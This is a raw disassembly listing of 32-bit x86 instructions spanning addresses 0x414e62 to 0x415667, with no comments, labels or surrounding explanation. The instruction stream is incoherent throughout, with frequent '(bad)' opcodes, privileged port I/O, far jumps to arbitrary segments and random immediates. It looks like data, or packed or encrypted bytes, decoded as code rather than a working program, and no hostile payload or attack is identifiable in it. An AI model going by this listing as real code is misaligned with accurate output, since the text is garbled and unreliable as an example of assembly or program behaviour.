  414e62:	lods   eax,DWORD PTR ds:[esi]
  414e63:	xor    esi,ecx
  414e65:	mov    dl,0x7b
  414e67:	xchg   edi,eax
  414e68:	dec    ecx
  414e69:	xchg   esi,eax
  414e6a:	add    ch,bh
  414e6c:	dec    ebx
  414e6d:	jg     0x414df1
  414e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e70:	push   ss
  414e71:	dec    ecx
  414e72:	ins    DWORD PTR es:[edi],dx
  414e73:	pop    edx
  414e74:	es push edx
  414e76:	xchg   esp,eax
  414e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e78:	ins    DWORD PTR es:[edi],dx
  414e79:	lea    ebp,[ebx+0xb51167f]
  414e7f:	sub    bl,BYTE PTR [edx-0x69575fe6]
  414e85:	xor    ecx,DWORD PTR [edx+0x4939a6be]
  414e8b:	js     0x414e19
  414e8d:	popf   
  414e8e:	jnp    0x414e6a
  414e90:	outs   dx,DWORD PTR ds:[esi]
  414e91:	dec    esi
  414e92:	js     0x414edd
  414e94:	je     0x414e7c
  414e96:	js     0x414ef7
  414e98:	xor    bl,bh
  414e9a:	pop    ebp
  414e9b:	pushf  
  414e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9d:	inc    ebp
  414e9e:	sahf   
  414e9f:	fs ror dh,cl
  414ea2:	clc    
  414ea3:	rol    BYTE PTR [ebp+0x3d],0x3a
  414ea7:	fs inc eax
  414ea9:	push   ecx
  414eaa:	jo     0x414eef
  414eac:	in     al,dx
  414ead:	adc    eax,0xcd8683db
  414eb2:	or     ch,bl
  414eb4:	inc    ebx
  414eb5:	jno    0x414e5a
  414eb7:	xor    cl,BYTE PTR [edx+0x8d3c18e]
  414ebd:	ds mov eax,0x7f878fed
  414ec3:	sub    DWORD PTR [ebp+0x65a7c15c],edi
  414ec9:	imul   esi,DWORD PTR [eax],0x2f
  414ecc:	sub    BYTE PTR [edi],dl
  414ece:	dec    eax
  414ecf:	dec    edi
  414ed0:	jb     0x414e9f
  414ed2:	push   ss
  414ed3:	xor    edx,DWORD PTR ds:0x25ca11ba
  414ed9:	loopne 0x414eea
  414edb:	(bad)  
  414edc:	lea    esi,[eax+0x4]
  414edf:	pop    edx
  414ee0:	pop    es
  414ee1:	add    DWORD PTR es:[ecx-0x68],0x22
  414ee6:	call   0xf02:0xe2f19659
  414eed:	sub    BYTE PTR [edx],dh
  414eef:	or     ebx,0x7d
  414ef2:	ins    BYTE PTR es:[edi],dx
  414ef3:	cdq    
  414ef4:	popf   
  414ef5:	sbb    al,0x29
  414ef7:	imul   BYTE PTR [bp+si-0x70]
  414efb:	add    ch,cl
  414efd:	push   ebp
  414efe:	retf   
  414eff:	into   
  414f00:	je     0x414f68
  414f02:	ret    0xff0e
  414f05:	ins    DWORD PTR es:[edi],dx
  414f06:	repnz mov ebx,0xbd75a3de
  414f0c:	es fucomi st,st(1)
  414f0f:	push   ebx
  414f10:	jmp    0x98e3a036
  414f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f16:	mov    al,ds:0xb46f73d6
  414f1b:	xchg   edi,eax
  414f1c:	lds    ebx,FWORD PTR [edx]
  414f1e:	mov    BYTE PTR [ebx+0x7040afa],al
  414f24:	stos   BYTE PTR es:[edi],al
  414f25:	mov    dh,0x90
  414f27:	fidiv  DWORD PTR [esi]
  414f29:	jo     0x414eb1
  414f2b:	adc    dl,bl
  414f2d:	test   al,0xb7
  414f2f:	adc    al,BYTE PTR [ecx-0x6d902398]
  414f35:	lahf   
  414f36:	pushf  
  414f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f38:	(bad)  
  414f39:	mov    ecx,0x3e50cf10
  414f3e:	cs push ds
  414f40:	cwde   
  414f41:	pop    eax
  414f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f43:	jmp    0x414f62
  414f45:	scas   al,BYTE PTR es:[edi]
  414f46:	scas   eax,DWORD PTR es:[edi]
  414f47:	and    DWORD PTR [ebx],eax
  414f49:	jle    0x414f0b
  414f4b:	enter  0xbfcd,0x85
  414f4f:	push   0xffffffce
  414f51:	aas    
  414f52:	adc    ch,BYTE PTR [eax]
  414f54:	mov    ebp,0x51270a6e
  414f59:	fs jl  0x414f37
  414f5c:	xchg   edi,eax
  414f5d:	mov    ecx,0x400d75a2
  414f62:	pop    esi
  414f63:	scas   al,BYTE PTR es:[edi]
  414f64:	js     0x414f56
  414f66:	je     0x414fb7
  414f68:	cld    
  414f69:	sub    esi,DWORD PTR [edi-0x20]
  414f6c:	jg     0x414f5a
  414f6e:	test   dl,al
  414f70:	call   0xffe9:0xd4889dbd
  414f77:	popf   
  414f78:	outs   dx,DWORD PTR ds:[esi]
  414f79:	xchg   DWORD PTR [ebx+0x7d],ebx
  414f7c:	inc    DWORD PTR [esi+0x45]
  414f7f:	(bad)  
  414f80:	sub    BYTE PTR [edx+ebx*2-0x5b],ah
  414f84:	jmp    0x453cdae
  414f89:	fidivr DWORD PTR ds:0x8b07acbd
  414f8f:	xchg   BYTE PTR [esi+0x722ffbc9],al
  414f95:	dec    ebx
  414f96:	pop    esp
  414f97:	mov    al,ch
  414f99:	pop    ebx
  414f9a:	xchg   esi,eax
  414f9b:	ja     0x414fe3
  414f9d:	mov    eax,ds:0x911cafd8
  414fa2:	mov    ch,0x6f
  414fa4:	test   eax,0xc4dd968a
  414fa9:	dec    esp
  414faa:	pop    esp
  414fab:	mov    eax,0xcedc7ffb
  414fb0:	fsub   DWORD PTR ds:0x2530d323
  414fb6:	(bad)  
  414fb7:	jmp    0x8fdc:0xf7c83808
  414fbe:	inc    edi
  414fbf:	arpl   WORD PTR [ebx+edx*1-0x2f],cx
  414fc3:	jmp    0x415020
  414fc5:	jb     0x414fc3
  414fc7:	out    dx,al
  414fc8:	mov    edx,0xaf551c34
  414fcd:	scas   al,BYTE PTR es:[edi]
  414fce:	ret    
  414fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd0:	sbb    DWORD PTR [ecx+0x6c],esi
  414fd3:	and    cl,ch
  414fd5:	stos   DWORD PTR es:[edi],eax
  414fd6:	fnsave [ecx]
  414fd8:	imul   esi,DWORD PTR [ecx+ebp*1+0x433d0b19],0xffffffe9
  414fe0:	xchg   BYTE PTR ds:0xc9a030b5,cl
  414fe6:	mov    cl,0x5c
  414fe8:	jle    0x415066
  414fea:	ins    DWORD PTR es:[edi],dx
  414feb:	mov    ebp,0x4c2eba76
  414ff0:	rol    ah,0xc2
  414ff3:	test   eax,0xb89a7594
  414ff8:	sti    
  414ff9:	scas   al,BYTE PTR es:[edi]
  414ffa:	push   edi
  414ffb:	xchg   edx,eax
  414ffc:	in     al,0xf5
  414ffe:	add    ah,ch
  415000:	cli    
  415001:	adc    eax,eax
  415003:	loope  0x414fab
  415005:	dec    ebp
  415006:	jl     0x414fe5
  415008:	rcl    DWORD PTR [ebp+0x36],1
  41500b:	jns    0x415023
  41500d:	xchg   ecx,eax
  41500e:	arpl   WORD PTR [ecx-0x6e],cx
  415011:	sar    DWORD PTR [esp+eiz*8],cl
  415014:	xchg   edx,eax
  415015:	in     al,0x3c
  415017:	leave  
  415018:	imul   DWORD PTR [ebx+0xa]
  41501b:	adc    al,0x4e
  41501d:	repz cmp ah,BYTE PTR [esi+eax*4]
  415021:	xor    DWORD PTR [ecx-0x47201b3],edi
  415027:	dec    ecx
  415028:	dec    DWORD PTR [ebx+ecx*4]
  41502b:	and    al,0x43
  41502d:	(bad)  
  41502e:	jb     0x414fb5
  415030:	pop    esi
  415031:	and    BYTE PTR [ebx],dl
  415033:	nop
  415034:	jae    0x415081
  415036:	call   0x704:0x99de243a
  41503d:	add    al,BYTE PTR [edi+0x3f]
  415040:	pop    edx
  415041:	cli    
  415042:	enter  0xf4a1,0xbd
  415046:	cmp    bh,BYTE PTR [edi]
  415048:	cld    
  415049:	dec    eax
  41504a:	cmp    BYTE PTR [eax],cl
  41504c:	lds    ebx,FWORD PTR [eax]
  41504e:	pop    ds
  41504f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415050:	dec    ecx
  415051:	pop    ss
  415052:	into   
  415053:	jae    0x41502b
  415055:	aad    0xa2
  415057:	fidiv  DWORD PTR [edx]
  415059:	jecxz  0x415050
  41505b:	test   eax,0x967a90d2
  415060:	cmp    DWORD PTR [ecx-0x6837c260],esi
  415066:	jbe    0x4150d8
  415068:	(bad)  [eax-0x65cc0f84]
  41506e:	les    esp,FWORD PTR [esp+ebp*8+0xb4a987]
  415075:	sbb    al,ah
  415077:	cwde   
  415078:	mov    ch,0x4b
  41507a:	jne    0x415025
  41507c:	ins    DWORD PTR es:[edi],dx
  41507d:	mov    DWORD PTR [edi+edi*2+0x27],esp
  415081:	outs   dx,DWORD PTR ds:[esi]
  415082:	out    0x21,eax
  415084:	mov    esp,0xdaf9f175
  415089:	mov    ds:0xb10e2cfb,eax
  41508e:	lods   al,BYTE PTR gs:[esi]
  415090:	icebp  
  415091:	sub    al,0xd4
  415093:	dec    eax
  415094:	arpl   WORD PTR [ebx],sp
  415096:	mov    dl,BYTE PTR [ebp-0x26]
  415099:	adc    BYTE PTR [esi+0x3df18dc3],0x38
  4150a0:	pop    esi
  4150a1:	(bad)  
  4150a2:	jbe    0x4150af
  4150a4:	jg     0x415061
  4150a6:	imul   esp,DWORD PTR [eax],0x13b66a96
  4150ac:	repnz enter 0x7bab,0x47
  4150b1:	ror    DWORD PTR [ebx+0x15],0x5b
  4150b5:	add    edi,0xffffffaf
  4150b8:	rcr    bh,0xcf
  4150bb:	std    
  4150bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150bd:	stc    
  4150be:	jae    0x41510b
  4150c0:	shl    BYTE PTR [esi+0x58],1
  4150c3:	jmp    0x4150df
  4150c5:	mov    ebp,0xff39e235
  4150ca:	daa    
  4150cb:	popa   
  4150cc:	ret    0x2cda
  4150cf:	and    DWORD PTR [edx+0x14890a44],esp
  4150d5:	ins    BYTE PTR es:[edi],dx
  4150d6:	ss mov dh,0xc6
  4150d9:	mov    esi,0xf139025e
  4150de:	cs adc ah,dl
  4150e1:	mov    eax,ds:0xcbd7ffa3
  4150e6:	cwde   
  4150e7:	fwait
  4150e8:	pop    ebp
  4150e9:	pushf  
  4150ea:	mov    ah,0x5b
  4150ec:	sbb    DWORD PTR [ebp+ebp*4+0x4c23f853],esp
  4150f3:	mov    ebp,0xf9201848
  4150f8:	and    dh,BYTE PTR [ebx+0x7f662631]
  4150fe:	aam    0x2f
  415100:	push   ecx
  415101:	xchg   ecx,eax
  415102:	sub    eax,0x51c6f833
  415107:	or     BYTE PTR [edx+0x26e943cd],bl
  41510d:	xor    BYTE PTR [esi-0x4bbf0f8e],bh
  415113:	jle    0x415104
  415115:	mov    esi,0x2cb0eabb
  41511a:	enter  0x2824,0xbf
  41511e:	ss mov dh,0x36
  415121:	out    0x71,al
  415123:	lock and DWORD PTR [ebp-0x6c],ebp
  415127:	out    0x2b,eax
  415129:	dec    DWORD PTR [edi+0x3e]
  41512c:	or     al,0x8d
  41512e:	ret    
  41512f:	adc    al,0xfe
  415131:	out    dx,al
  415132:	jne    0x4150e9
  415134:	adc    BYTE PTR ds:0x1f0acac5,bl
  41513a:	xchg   edi,eax
  41513b:	and    edi,edi
  41513d:	shr    BYTE PTR [esi-0x72],cl
  415140:	push   cs
  415141:	mov    edx,DWORD PTR [eax-0x72fce692]
  415147:	cmp    ebp,ecx
  415149:	xor    eax,0xb4b72ec1
  41514e:	inc    edi
  41514f:	pop    es
  415150:	sahf   
  415151:	rcl    DWORD PTR [esi+0x7545b5e1],cl
  415157:	cmp    BYTE PTR [edx+ebx*2+0x53],bl
  41515b:	popf   
  41515c:	xchg   ebp,eax
  41515d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41515e:	sbb    dl,BYTE PTR [esi]
  415160:	popf   
  415161:	and    BYTE PTR [esi+0x2b],cl
  415164:	inc    edi
  415165:	mov    eax,ds:0xf68e9d3e
  41516b:	adc    DWORD PTR [esi],ebx
  41516d:	fimul  DWORD PTR [ebx+ebx*1]
  415170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415171:	sub    BYTE PTR [edx+0x7f],al
  415174:	pusha  
  415175:	sub    DWORD PTR [eax],ebp
  415177:	jmp    0x4151f6
  415179:	sbb    eax,0x296954be
  41517e:	sbb    ebx,DWORD PTR [ecx]
  415180:	fdivr  st(3),st
  415182:	sub    eax,edx
  415184:	ja     0x415106
  415186:	scas   eax,DWORD PTR es:[edi]
  415187:	pop    es
  415188:	aad    0x66
  41518a:	test   al,0x72
  41518c:	test   al,0xf
  41518e:	dec    edx
  41518f:	jno    0x4151b8
  415191:	dec    ebp
  415192:	cwde   
  415193:	or     eax,0x5478590
  415198:	pop    ss
  415199:	into   
  41519a:	and    al,0x37
  41519c:	in     eax,0xbe
  41519e:	push   es
  41519f:	pop    esp
  4151a0:	jmp    0x128:0xc8e5126f
  4151a7:	rcl    DWORD PTR [ecx+0x5c],0x9a
  4151ab:	popa   
  4151ac:	push   edi
  4151ad:	cwde   
  4151ae:	cmp    ecx,DWORD PTR [edi+0x5]
  4151b1:	jl     0x4151d6
  4151b3:	or     edi,DWORD PTR cs:[ebp-0x13956cf8]
  4151ba:	sbb    DWORD PTR [edx+0x587ae616],0xffffffca
  4151c1:	sbb    al,dh
  4151c3:	sub    DWORD PTR [eax+edx*4],edx
  4151c6:	push   ss
  4151c7:	mov    esp,0x5c8fda03
  4151cc:	int3   
  4151cd:	call   0x4c44be71
  4151d2:	gs jmp 0x7238c508
  4151d8:	ret    0x39e0
  4151db:	(bad)  
  4151dd:	sbb    ch,BYTE PTR [edi+edx*1]
  4151e0:	fist   DWORD PTR [edx]
  4151e2:	add    BYTE PTR [ebp+edi*4-0x60],dh
  4151e6:	dec    esp
  4151e7:	stc    
  4151e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e9:	(bad)  
  4151ea:	mov    ebx,0xb9b141d5
  4151ef:	cmp    al,BYTE PTR [edi+0x3011a1d8]
  4151f5:	sub    eax,0xeedbd49e
  4151fa:	sbb    eax,0x3f44c4f6
  4151ff:	mov    bh,0x45
  415201:	arpl   WORD PTR [ebx-0x984b316],si
  415207:	inc    ecx
  415208:	test   eax,0x43f6cc26
  41520d:	jno    0x4151fe
  41520f:	adc    al,0xa
  415211:	or     BYTE PTR [esi-0x7e09670c],cl
  415217:	rcl    DWORD PTR [ebx+edx*8-0x4a47701e],1
  41521e:	sbb    ch,BYTE PTR [edx-0x1]
  415221:	or     eax,DWORD PTR [ecx]
  415223:	jle    0x41526a
  415225:	push   0xffffffc9
  415227:	xor    ecx,DWORD PTR [ebp*4-0x304001ab]
  41522e:	or     BYTE PTR [ebx],dh
  415230:	xor    eax,esi
  415232:	adc    DWORD PTR [edi+eiz*8+0x7c77e331],0x3e8de4e7
  41523d:	cld    
  41523e:	jge    0x415230
  415240:	in     al,0x4e
  415242:	int3   
  415243:	jmp    0x41528b
  415245:	fisttp WORD PTR [edi+0x3c447701]
  41524b:	or     ebx,edi
  41524d:	lock xor eax,ecx
  415250:	int    0x3e
  415252:	add    ah,BYTE PTR [ebx-0x361e28cf]
  415258:	sub    edx,edx
  41525a:	lahf   
  41525b:	sub    DWORD PTR [esi+0x1d803df7],esi
  415261:	mov    cl,0x45
  415263:	add    eax,DWORD PTR [ebx+ebx*4-0x300a101d]
  41526a:	cdq    
  41526b:	imul   esp,DWORD PTR [esi+0x653ac2de],0x71c54f00
  415275:	pop    ecx
  415276:	loopne 0x4152e7
  415278:	adc    esp,esp
  41527a:	sub    BYTE PTR [edx-0x61e8df8a],ah
  415280:	sti    
  415281:	push   esi
  415282:	pop    es
  415283:	push   edx
  415284:	test   DWORD PTR [edi],ebx
  415286:	and    ebx,ecx
  415288:	push   edi
  415289:	jbe    0x415260
  41528b:	shl    DWORD PTR [ecx+eax*2+0x3f],1
  41528f:	rol    DWORD PTR [ecx+0x50b273c4],1
  415295:	ja     0x41527b
  415297:	aad    0x14
  415299:	jnp    0x415231
  41529b:	or     BYTE PTR [edi+0x6c32c231],bl
  4152a1:	jl     0x4152a6
  4152a3:	adc    ah,BYTE PTR [eax+0x1a]
  4152a6:	iret   
  4152a7:	cmp    WORD PTR [ebp-0x355dc666],cx
  4152ae:	les    ebp,FWORD PTR [ecx-0x23]
  4152b1:	xor    BYTE PTR [ecx+0x3c6d73f2],cl
  4152b7:	dec    edx
  4152b8:	scas   al,BYTE PTR es:[edi]
  4152b9:	leave  
  4152ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152bb:	addr16 jp 0x415310
  4152be:	cmp    ebp,DWORD PTR gs:[eax+edi*2]
  4152c2:	loop   0x41531c
  4152c4:	add    BYTE PTR es:[edx+edi*1-0x1b],0x6e
  4152ca:	sub    BYTE PTR [edx+ebx*8+0x7f],ch
  4152ce:	jnp    0x4152c4
  4152d0:	and    eax,0xadf11b24
  4152d5:	push   ss
  4152d6:	jbe    0x415337
  4152d8:	ja     0x4152a6
  4152da:	push   ecx
  4152db:	cdq    
  4152dc:	test   BYTE PTR [ecx-0xf75770b],dh
  4152e2:	xchg   edx,esi
  4152e4:	les    esi,FWORD PTR ds:0x8015eba6
  4152ea:	mov    cl,0xd9
  4152ec:	and    DWORD PTR [edx+0x18],ebx
  4152ef:	outs   dx,BYTE PTR ds:[esi]
  4152f0:	or     cl,0xcd
  4152f3:	jo     0x41534c
  4152f5:	inc    esi
  4152f6:	add    al,0x1e
  4152f8:	push   ds
  4152f9:	not    esi
  4152fb:	jns    0x41529c
  4152fd:	out    0x51,al
  4152ff:	push   0x69
  415301:	(bad)  
  415303:	adc    ebx,DWORD PTR ds:0x774d95ed
  415309:	sbb    bl,BYTE PTR [ecx+0x4f]
  41530c:	pusha  
  41530d:	mov    ecx,DWORD PTR [edx]
  41530f:	sti    
  415310:	out    dx,eax
  415311:	(bad)  
  415312:	shl    BYTE PTR [ebp-0x1f7e3bcd],cl
  415318:	jmp    0xf7068803
  41531d:	adc    dl,BYTE PTR [ecx]
  41531f:	jmp    0x4152e7
  415321:	adc    eax,0x58f0289d
  415326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415327:	cli    
  415328:	add    al,0x74
  41532a:	xor    al,0xc6
  41532c:	bsf    eax,ecx
  41532f:	mov    ds:0xd6ff5811,eax
  415334:	xchg   ecx,eax
  415335:	mov    dh,0x7c
  415337:	mov    esp,0x9c120ed4
  41533c:	scas   eax,DWORD PTR es:[edi]
  41533d:	mov    edx,0x2dbe52d1
  415342:	dec    esi
  415343:	adc    BYTE PTR [ebx],dh
  415345:	call   0x428068af
  41534a:	cs add dh,ah
  41534d:	xchg   edx,ebp
  41534f:	fldenv [esi+0x77]
  415352:	xor    DWORD PTR [edi+ebp*2],ecx
  415355:	add    al,0xf3
  415357:	ret    
  415358:	fwait
  415359:	add    ebp,ebp
  41535b:	pop    edx
  41535c:	pop    es
  41535d:	sar    bl,1
  41535f:	and    al,0x4
  415361:	ss popf 
  415363:	test   DWORD PTR [esp+ebx*4+0x2a],ebp
  415367:	pop    ebp
  415368:	in     al,0x16
  41536a:	push   ecx
  41536b:	xor    edx,DWORD PTR [edx+edi*2]
  41536e:	cmp    cl,0xb2
  415371:	cmp    al,0xf4
  415373:	retf   
  415374:	(bad)  
  415375:	shl    BYTE PTR [ebx-0x21f65f8c],cl
  41537b:	imul   esp,edx,0xffffffc9
  41537e:	cmp    al,0xc6
  415380:	test   eax,0xaaded60b
  415385:	cmp    eax,0x8dc7b30
  41538a:	(bad)  
  41538c:	mov    edx,0x233932de
  415391:	out    dx,al
  415392:	mov    edx,0xe465c191
  415397:	fdivr  QWORD PTR [eax+0x5482109b]
  41539d:	cmp    DWORD PTR [edi+0x5c5fa77b],ecx
  4153a3:	xchg   bl,bh
  4153a5:	enter  0x7988,0x9b
  4153a9:	and    BYTE PTR [eax+0x3],0xee
  4153ad:	push   eax
  4153ae:	jl     0x41542d
  4153b0:	or     al,0x2b
  4153b2:	nop
  4153b3:	sbb    eax,0xab15808c
  4153b8:	js     0x415403
  4153ba:	pop    ds
  4153bb:	adc    al,0xf7
  4153bd:	xchg   ebx,eax
  4153be:	fbstp  TBYTE PTR [ecx-0x7383067d]
  4153c4:	in     al,0xd7
  4153c6:	je     0x4153c1
  4153c8:	mov    bl,BYTE PTR [ebx]
  4153ca:	lea    esi,[ecx]
  4153cc:	repz jge 0x41536b
  4153cf:	pusha  
  4153d0:	sub    eax,0xd21eb44e
  4153d5:	(bad)  
  4153d6:	es neg edx
  4153d9:	mov    cl,0x8f
  4153db:	outs   dx,BYTE PTR ds:[esi]
  4153dc:	(bad)  
  4153dd:	dec    ecx
  4153de:	push   es
  4153df:	retf   
  4153e0:	inc    edx
  4153e1:	xchg   DWORD PTR [eax+0x1ee74420],eax
  4153e7:	jge    0x41540b
  4153e9:	in     eax,0xb1
  4153eb:	aaa    
  4153ec:	mov    ds:0x884d6445,al
  4153f2:	xchg   edx,eax
  4153f3:	or     ebx,ebx
  4153f5:	add    eax,0xe43ff0e9
  4153fa:	xchg   esp,eax
  4153fb:	dec    ecx
  4153fc:	fisub  DWORD PTR [eax]
  4153fe:	pusha  
  4153ff:	scas   al,BYTE PTR es:[edi]
  415400:	add    esp,DWORD PTR [ecx]
  415402:	adc    esi,DWORD PTR [ecx+0x27470f60]
  415408:	outs   dx,DWORD PTR ds:[esi]
  415409:	mov    eax,ds:0x93b0170e
  41540e:	rol    al,cl
  415410:	xor    al,bh
  415412:	je     0x41545f
  415414:	push   DWORD PTR [ecx-0x513da2db]
  41541a:	mov    ebx,0xf15934d1
  41541f:	mov    eax,fs:0xa9722983
  415425:	test   edi,0xab6e800e
  41542b:	lock pusha 
  41542d:	mov    esp,0x75250a8b
  415432:	push   0x416b3a28
  415437:	and    BYTE PTR [esi],al
  415439:	ja     0x415450
  41543b:	imul   edi,DWORD PTR [edx+0x68],0xffffff9c
  41543f:	inc    esi
  415440:	fmulp  st(5),st
  415442:	loopne 0x4153c7
  415444:	jge    0x41548e
  415446:	into   
  415447:	loop   0x415407
  415449:	shl    DWORD PTR [edx+0x24],1
  41544c:	add    BYTE PTR [edi+0x14f8f909],bh
  415452:	cli    
  415453:	cmc    
  415454:	push   edx
  415455:	add    ebp,DWORD PTR [edi-0x39]
  415458:	xor    eax,0x7c8131bd
  41545d:	out    dx,eax
  41545e:	cmp    eax,DWORD PTR [ebp-0x23]
  415461:	pop    edx
  415462:	mov    ds:0xd9f418eb,eax
  415467:	jmp    0xd510:0xc2868b31
  41546e:	add    eax,DWORD PTR [ebp-0x2f1b1c]
  415474:	jl     0x415407
  415476:	not    DWORD PTR [ebx+0x47038222]
  41547c:	xor    al,0xbd
  41547e:	mov    ds:0xbf9b66d6,eax
  415483:	in     eax,0xfb
  415485:	pop    edx
  415486:	add    dh,dh
  415488:	or     eax,0x71ca90f0
  41548d:	test   DWORD PTR [ebx-0x9ffd0fd],ebp
  415493:	adc    DWORD PTR [edx],eax
  415495:	sbb    edx,DWORD PTR [ebx-0x41]
  415498:	daa    
  415499:	out    0x1c,eax
  41549b:	push   0x327903ee
  4154a0:	sbb    ebp,DWORD PTR [esi-0x59b93dc9]
  4154a6:	mov    ds:0x27dff545,eax
  4154ab:	fiadd  WORD PTR [eax+0x33d788eb]
  4154b1:	pop    eax
  4154b2:	lahf   
  4154b3:	icebp  
  4154b4:	into   
  4154b5:	or     eax,0xa29dbbe5
  4154ba:	pop    ds
  4154bb:	mov    bl,0x4f
  4154bd:	push   ebp
  4154be:	adc    ah,BYTE PTR [ebx+edx*2]
  4154c1:	jbe    0x4154c2
  4154c3:	fwait
  4154c4:	pop    ecx
  4154c5:	sub    al,0x1b
  4154c7:	out    dx,al
  4154c8:	(bad)  
  4154c9:	enter  0x2c27,0x68
  4154cd:	or     al,0xa4
  4154cf:	xchg   edx,eax
  4154d0:	jno    0x415484
  4154d2:	mov    esi,0xddf608c3
  4154d7:	mov    ebp,0x509a3d33
  4154dc:	aad    0x70
  4154de:	iret   
  4154df:	mov    WORD PTR [eax-0x1857d388],ss
  4154e5:	sbb    esp,eax
  4154e7:	push   edi
  4154e8:	jae    0x4154a3
  4154ea:	mov    DWORD PTR [eax-0x61],eax
  4154ed:	inc    edx
  4154ee:	repz pop edx
  4154f0:	pop    ss
  4154f1:	repz mov ebx,0x79480615
  4154f7:	nop
  4154f8:	bound  edi,QWORD PTR [ebx]
  4154fa:	or     BYTE PTR [ebp+ecx*4+0x1ba4078b],ch
  415501:	jg     0x41554c
  415503:	retf   0xf783
  415506:	mov    esp,0xd74693d9
  41550b:	pop    ds
  41550c:	jp     0x415586
  41550e:	xchg   DWORD PTR [esi+0x5dd733fc],ebx
  415514:	jbe    0x415509
  415516:	xchg   esi,eax
  415517:	mov    edx,0x9cb8c1f3
  41551c:	icebp  
  41551d:	repnz mov DWORD PTR [edi-0x71699339],0x44be858f
  415528:	adc    esi,ecx
  41552a:	inc    ebx
  41552b:	inc    eax
  41552c:	scas   al,BYTE PTR es:[edi]
  41552d:	jl     0x4154b0
  41552f:	adc    ebx,ebp
  415531:	stos   DWORD PTR es:[edi],eax
  415532:	pop    ss
  415533:	mov    bl,0xa8
  415535:	xor    BYTE PTR [esi+0x7d],ah
  415538:	es loopne 0x41558c
  41553b:	or     BYTE PTR [ebx+0x568f1c3],ch
  415541:	inc    ebp
  415542:	dec    esi
  415543:	pop    ebx
  415544:	jge    0x415591
  415546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415547:	pop    ecx
  415548:	lods   al,BYTE PTR ds:[esi]
  415549:	stc    
  41554a:	sub    edi,DWORD PTR [esi+esi*2+0x585e81e5]
  415551:	push   0x2387e206
  415556:	sbb    DWORD PTR ds:0x787dc4d3,edi
  41555c:	in     al,dx
  41555d:	adc    dh,bl
  41555f:	ret    0xd924
  415562:	cmp    BYTE PTR [eax-0x4f859b9b],ah
  415568:	pop    esp
  415569:	pop    ecx
  41556a:	fs (bad) 
  41556c:	push   edi
  41556d:	bound  esp,QWORD PTR [eax-0x41be3671]
  415573:	aas    
  415574:	test   DWORD PTR [ebx-0x32],0x344faf4d
  41557b:	sub    DWORD PTR [ebp+0x66],ebx
  41557e:	inc    ebp
  41557f:	jo     0x415526
  415581:	jle    0x415554
  415583:	pushf  
  415584:	arpl   WORD PTR [ebp+ecx*4+0x63],si
  415588:	dec    edx
  415589:	les    esi,FWORD PTR [ecx-0x1f]
  41558c:	mov    BYTE PTR [esi+0x6f70701f],dh
  415592:	push   ss
  415593:	rol    BYTE PTR [esi+0x25],0xa9
  415597:	inc    edx
  415598:	xor    bh,BYTE PTR [eax+0x2d]
  41559b:	mov    esp,0xf6de5a2d
  4155a0:	stos   BYTE PTR es:[edi],al
  4155a1:	jns    0x4155fb
  4155a3:	push   esi
  4155a4:	jno    0x415555
  4155a6:	std    
  4155a7:	or     DWORD PTR [esi-0x6df00ae],ecx
  4155ad:	fcom   DWORD PTR [edx+0x51]
  4155b0:	imul   eax
  4155b2:	aam    0x5b
  4155b4:	pop    ebp
  4155b5:	cld    
  4155b6:	xor    al,dl
  4155b8:	push   ebx
  4155b9:	adc    al,0xd5
  4155bb:	dec    esp
  4155bc:	inc    ebx
  4155bd:	mov    ss,WORD PTR fs:[edx+edx*4]
  4155c1:	lea    eax,[edx-0x5a]
  4155c4:	and    bl,BYTE PTR [edi-0x6ecb4a05]
  4155ca:	add    cl,BYTE PTR [edx-0x253cd018]
  4155d0:	pop    eax
  4155d1:	pop    ecx
  4155d2:	sbb    eax,0xcd93cf9c
  4155d7:	sub    edx,ebp
  4155d9:	mov    BYTE PTR [ebx+0x18ec73ea],bh
  4155df:	dec    edx
  4155e0:	cmc    
  4155e1:	jno    0x415613
  4155e3:	inc    ebp
  4155e4:	(bad)  
  4155e5:	ja     0x4155fd
  4155e7:	out    dx,al
  4155e8:	xor    eax,0xbddb1b1c
  4155ed:	jp     0x4155e7
  4155ef:	cmp    al,0x1b
  4155f1:	fs push esp
  4155f3:	mov    ebx,0xd5cb96f9
  4155f8:	inc    esi
  4155f9:	test   DWORD PTR [ecx+0x61],ebp
  4155fc:	(bad)  
  4155fd:	cmc    
  4155fe:	inc    esp
  4155ff:	mov    edx,0xd71eafe1
  415604:	mov    ch,BYTE PTR [ecx]
  415606:	cld    
  415607:	adc    BYTE PTR [edi+0x58],bl
  41560a:	push   eax
  41560b:	lock dec esp
  41560d:	adc    al,0xa6
  41560f:	ret    
  415610:	or     dh,al
  415612:	ror    BYTE PTR ds:[eax-0x32457914],0x8b
  41561a:	jbe    0x415656
  41561c:	dec    esi
  41561d:	ret    0x4987
  415620:	xchg   edx,eax
  415621:	test   BYTE PTR [edi+0x32],ah
  415624:	inc    edi
  415625:	sbb    eax,0x395975bd
  41562a:	call   0x4af4aaf4
  41562f:	cmc    
  415630:	cld    
  415631:	pop    esi
  415632:	push   0x71
  415634:	mov    al,ds:0xa9d71b1e
  415639:	imul   esp,DWORD PTR ds:0x1ab4587c,0x73e6b7b0
  415643:	fist   WORD PTR [edx-0x794cdb6d]
  415649:	daa    
  41564a:	pop    eax
  41564b:	cmp    BYTE PTR [edi+0x43],bl
  41564e:	mov    dh,0xec
  415650:	ror    DWORD PTR [esi-0x39ab08fe],cl
  415656:	fldenv [esi-0x7f]
  415659:	xchg   esp,eax
  41565a:	clc    
  41565b:	je     0x41568e
  41565d:	test   al,0x24
  41565f:	jmp    0xd81deb3f
  415664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415665:	js     0x41565b
  415667:	mov    ecx,0xfd768c84
